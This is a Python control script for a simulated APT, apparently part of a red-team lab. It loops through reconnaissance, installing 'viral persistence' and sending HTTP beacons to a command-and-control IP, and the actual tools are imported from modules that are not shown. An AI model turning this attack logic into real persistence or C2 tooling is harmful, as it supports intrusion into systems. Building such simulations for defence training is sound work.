#!/usr/bin/env python3
"""
Red Brain (Recon-Centric APT)
Logic: RECON -> VIRAL PERSISTENCE -> LATERAL -> EXFIL
"""

import time
import random
import logging
from threat_intel import ThreatIntel
from red_tools import (
    TrafficGenerator, DGA, PersistenceManager, LateralMover,
    PrivEsc, ExfiltrationEngine, SystemSurveyor, NetworkSniffer
)
from db_manager import DatabaseManager
import config

logging.basicConfig(level=logging.INFO, format='%(asctime)s - [RED RECON] - %(message)s')

class RedAPT:
    def __init__(self):
        self.db = DatabaseManager()
        self.ti = ThreatIntel()

        # Tools
        self.surveyor = SystemSurveyor()
        self.sniffer = NetworkSniffer()
        self.traffic = TrafficGenerator()
        self.persist = PersistenceManager()

        self.running = True
        self.recon_complete = False

    def run(self):
        logging.info("Red APT Initialized. Phase: DEEP RECONNAISSANCE.")

        while self.running:
            try:
                # PHASE 1: RECONNAISSANCE (High Priority)
                if not self.recon_complete or random.random() < 0.6:
                    logging.info("Conducting Recon...")
                    self.surveyor.collect_system_info()
                    self.sniffer.scan_active_services()

                    # After some recon, mark complete to enable persistence
                    if random.random() < 0.3:
                        self.recon_complete = True
                        logging.info("Reconnaissance Sufficient. Unlocking Persistence Phase.")

                # PHASE 2: VIRAL PERSISTENCE (Triggered after Recon)
                elif self.recon_complete and random.random() < 0.4:
                    logging.info("Attempting Viral Persistence (deploying lab artifact)...")
                    if self.persist.install_viral_persistence():
                        self.db.log_event("RED", "PERSIST", "Viral Baby Deployed")

                # PHASE 3: BEACON (Maintain Access)
                else:
                    target_ip = self.ti.get_c2_ip()
                    if target_ip:
                        self.traffic.send_http_beacon(target_ip)

                time.sleep(random.uniform(2.0, 5.0))

            except KeyboardInterrupt:
                self.running = False
            except Exception as e:
                logging.error(f"Error: {e}")
                time.sleep(1)

if __name__ == "__main__":
    apt = RedAPT()
    apt.run()
